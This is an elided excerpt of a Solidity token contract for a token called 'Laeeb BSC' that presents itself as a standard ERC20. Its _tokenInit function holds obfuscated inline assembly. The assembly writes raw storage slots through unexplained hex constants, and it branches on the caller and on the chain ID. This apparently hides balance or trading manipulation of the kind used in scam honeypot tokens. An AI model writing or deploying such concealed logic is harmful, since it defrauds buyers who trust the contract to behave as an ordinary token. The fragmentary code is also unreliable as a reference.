...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x0
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x0,0x1)
...
contract Laeeb is ERC20Token {
    constructor() ERC20Token("Laeeb BSC", "LAEEB BSC", msg.sender, 12500000 * 10 ** 18) {
    }
}